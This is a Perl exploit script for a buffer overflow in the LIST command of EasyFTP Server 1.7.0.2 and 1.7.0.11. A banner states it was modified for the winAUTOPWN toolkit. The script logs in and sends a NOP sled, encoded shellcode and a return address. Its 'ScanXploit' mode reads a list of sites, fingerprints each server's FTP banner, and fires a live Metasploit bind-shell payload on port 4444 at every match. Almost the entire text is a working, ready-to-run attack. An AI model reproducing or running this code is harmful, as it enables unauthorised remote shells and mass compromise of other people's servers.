
sub banner {

print q {
##########################################################################################################
#									 				 #
# [*] PoC EasyFTP 1.7.0.X Crash					          				 #
#									 				 #
# [*] Author: Inj3cti0n P4ck3t					          				 #
#									 				 #
# [*] e-mail: fer_henrick@hotmail.com					 				 #
#									 				 #
# [*] Date: 18/10/2010							 				 #
#													 #
# [*] Greetz: C00l3r - fvox - _MLK_ - DD3str0y3r - s4r4d0 - Sh0rtKiller					 #
#	      HADES - CODERED - FORAST - Colt7r - Z4i0n - M0nt3r 	 				 #
#	      Th1nk3r - Hackinho - r0t3d - elemento_pcx - Observing					 #
#             Believe - dr4k3 - Bl4ck9_f0x6								 #
#									 				 #
# [*] Version Vulnerable:						  				 #
#									 				 #
#    - EasyFTP Server 1.7.0.11 EN					 				 #
#									 				 #
#    - EasyFTP Server 1.7.0.2  EN					 				 #
#									 				 #
#									 				 #
#									 				 #
# [*] System Operacional Tested: 					 				 #
#									 				 #
#    - Windows XP PACK 3 Brazilian					  				 #
#									 				 #
#									 				 #
#									 				 #
#									 				 #
#    - EasyFTP Server 1.7.0.2 =>  http://easyftpsvr.googlecode.com/files/easyftpsvr-1.7.0.2.zip  	 #
#									  				 #
#    - EasyFTP Server 1.7.0.11 => http://easyftpsvr.googlecode.com/files/easyftp-server-1.7.0.11-en.zip  #
#									 				 #
#									 				 #
###############################Code Exploit ##############################################################
##########################################################################################################
#                         Modified by QUAKERDOOMER for winAUTOPWN                                        #
##########################################################################################################


 		}
	}

#!usr/bin/perl

#use strict;
use IO::Socket;
use IO::Socket::INET;

if (!$ARGV[0]) {
	 
	&banner();

print q {

  Options:

 [1] - Test Exploit  
 [2] - Test ScanXploit

}
}

#print " [+] Options: "; our $option = <stdin>;
#chomp ($option);

my $option ="1";

if ($option == 1) {

my $hostTest           = $ARGV[0];
my $usuarioTest       = $ARGV[1];
my $senhaTest       = $ARGV[2];

my $portTest ="21";
#my $hostTest="127.0.0.1";
#my $usuarioTest ="anonymous";
#my $senhaTest = "adminadmin";

# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]
#my $shellCodeTest = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8\x51\x6b\x28");
$shellcode = ("SHALL BE CHANGED BY WINDOWS AUTOPWN");
 
my $nopsTest = ("\x90" x 40);
my $retornoTest = ("\x10\x3B\x88\x00"); # MAGIC RET 00883B10 [ CALL EDI ]
#my $PayloadTest = $nopsTest . $shellCodeTest . $retornoTest;
my $PayloadTest = $nopsTest . $shellcode . $retornoTest;

my $AutenticarTest = ("\x55\x53\x45\x52\x20" . $usuarioTest . "\r\n" . "\x50\x41\x53\x53\x20 " . $senhaTest . "\r\n" . "LIST " . $PayloadTest . "\r\n"  );

my $socketTest = new IO::Socket::INET (PeerAddr => $hostTest,PeerPort => $portTest,Proto => 'tcp',); die " [x] Error: $!\n" unless $socketTest;

    print $socketTest $AutenticarTest;

  close($socketTest);


sleep(2);

    our $soquetes = IO::Socket::INET->new("$hostTest:$portTest");

	if($soquetes) {


	print  " [-] Server no exploited \n";
}
else {

print " [+] Server Exploited\n";


}

}


##################################  ScanXploit		#############################################################################################

if ($option == 2) {
my $hostTest           = $ARGV[0];
my $usuarioTest       = $ARGV[1];
my $senhaTest       = $ARGV[2];

 
print " [+] Digite o nome da lista de sites, exampl,: lista.txt: ";
our $lista = <stdin>;
chomp ($lista);

open( SITE, "< $lista" ) or die( " [-] Could not open file: $!" );

our @array = <SITE>;

our $numero = $#array;

for (our $i = 0; $i <= $numero; $i++) {

our $Url = "$array[$i]";

if($Url !~ /http:\/\//) { $Url = "http://$Url"; }

our $Stop = index($Url,":");
our $Protocolo = substr($Url,0,$Stop);
our $Start = index($Url,"//") + 2;
our $Dominio = substr($Url,$Start);
our $Stop = index($Dominio,"/");
our $Dominio = substr($Dominio,0,$Stop);
our $Start = rindex($Url,"/") + 1;
our $NomeArq = substr($Url,$Start);
our $Compr_Url = length($Url);

our $ponto = "$Dominio \n";


 our @portas = "21";

  foreach our $porta (@portas) {
   


    our $sock = IO::Socket::INET->new("$ponto:$porta");

	if($sock) {

  	  our $remote = IO::Socket::INET -> new (Proto => "tcp", PeerAddr => $ponto, PeerPort => $porta, Timeout => "7");

          our $line = <$remote>;


	if ($line =~ "BigFoolCat") {

my $usuario ="anonymous";
my $senha = "adminadmin";

			
# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]
# my $shellCode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8\x51\x6b\x28");


# this is a bind-shell-code listening on TCP-Port:4444
# ./msfpayload windows/shell_bind_tcp R | ./msfencode -e x86/shikata_ga_nai -t c -b '\x00\x09\x0a'
# Payload changed by QUAKERDOOMER for winAUTOPWN to bindshell 4444
my $shellCode = "\xda\xc4\xd9\x74\x24\xf4\xbf\x99\xd0\x0e\xf5\x5e\x29\xc9\xb1".
"\x56\x31\x7e\x19\x03\x7e\x19\x83\xee\xfc\x7b\x25\xf2\x1d\xf2".
"\xc6\x0b\xde\x64\x4e\xee\xef\xb6\x34\x7a\x5d\x06\x3e\x2e\x6e".
"\xed\x12\xdb\xe5\x83\xba\xec\x4e\x29\x9d\xc3\x4f\x9c\x21\x8f".
"\x8c\xbf\xdd\xd2\xc0\x1f\xdf\x1c\x15\x5e\x18\x40\xd6\x32\xf1".
"\x0e\x45\xa2\x76\x52\x56\xc3\x58\xd8\xe6\xbb\xdd\x1f\x92\x71".
"\xdf\x4f\x0b\x0e\x97\x77\x27\x48\x08\x89\xe4\x8b\x74\xc0\x81".
"\x7f\x0e\xd3\x43\x4e\xef\xe5\xab\x1c\xce\xc9\x21\x5d\x16\xed".
"\xd9\x28\x6c\x0d\x67\x2a\xb7\x6f\xb3\xbf\x2a\xd7\x30\x67\x8f".
"\xe9\x95\xf1\x44\xe5\x52\x76\x02\xea\x65\x5b\x38\x16\xed\x5a".
"\xef\x9e\xb5\x78\x2b\xfa\x6e\xe1\x6a\xa6\xc1\x1e\x6c\x0e\xbd".
"\xba\xe6\xbd\xaa\xbc\xa4\xa9\x1f\xf2\x56\x2a\x08\x85\x25\x18".
"\x97\x3d\xa2\x10\x50\x9b\x35\x56\x4b\x5b\xa9\xa9\x74\x9b\xe3".
"\x6d\x20\xcb\x9b\x44\x49\x80\x5b\x68\x9c\x06\x0c\xc6\x4f\xe6".
"\xfc\xa6\x3f\x8e\x16\x29\x1f\xae\x18\xe3\x16\xe9\xd6\xd7\x7a".
"\x9d\x1a\xe8\x6d\x01\x92\x0e\xe7\xa9\xf2\x99\x90\x0b\x21\x12".
"\x06\x74\x03\x0e\x9f\xe2\x1b\x58\x27\x0d\x9c\x4e\x0b\xa2\x34".
"\x19\xd8\xa8\x80\x38\xdf\xe5\xa0\x33\xe7\x6d\x3a\x2a\xa5\x0c".
"\x3b\x67\x5d\xad\xae\xec\x9e\xb8\xd2\xba\xc9\xed\x25\xb3\x9c".
"\x03\x1f\x6d\x83\xde\xf9\x56\x07\x04\x3a\x58\x89\xc9\x06\x7e".
"\x99\x17\x86\x3a\xcd\xc7\xd1\x94\xbb\xa1\x8b\x56\x12\x7b\x67".
"\x31\xf2\xfa\x4b\x82\x84\x03\x86\x74\x68\xb5\x7f\xc1\x96\x79".
"\xe8\xc5\xef\x64\x88\x2a\x3a\x2d\xb8\x60\x67\x07\x51\x2d\xfd".
"\x1a\x3c\xce\x2b\x58\x39\x4d\xde\x20\xbe\x4d\xab\x25\xfa\xc9".
"\x47\x57\x93\xbf\x67\xc4\x94\x95\x62";

 
my $nops = ("\x90" x 40);
my $retorno = ("\x10\x3B\x88\x00"); # MAGIC RET 00883B10 [ CALL EDI ]
my $Payload = $nops . $shellCode . $retorno;

my $Autenticar = ("\x55\x53\x45\x52\x20" . $usuario . "\r\n" . "\x50\x41\x53\x53\x20 " . $senha . "\r\n" . "LIST " . $Payload . "\r\n"  );

our $socket = new IO::Socket::INET (PeerAddr => $ponto,PeerPort => $porta,Proto => 'tcp',); die "[x] Error: $!\n" unless $socket;

    print $socket $Autenticar;

  close($socket);


		  }
sleep(2);

    our $soquete = IO::Socket::INET->new("$ponto:$porta");

	if($soquete) {


	print  " [-] Server no exploited \n";
}
else {

print " [+] Server Exploited\n";


}

       	     }
        }
   }

print " [+] Servers tested: $numero \n";





}

if ($option != 1 && $option != 2 ) {

print " [+] Option invalid \n\n";

}

exit;
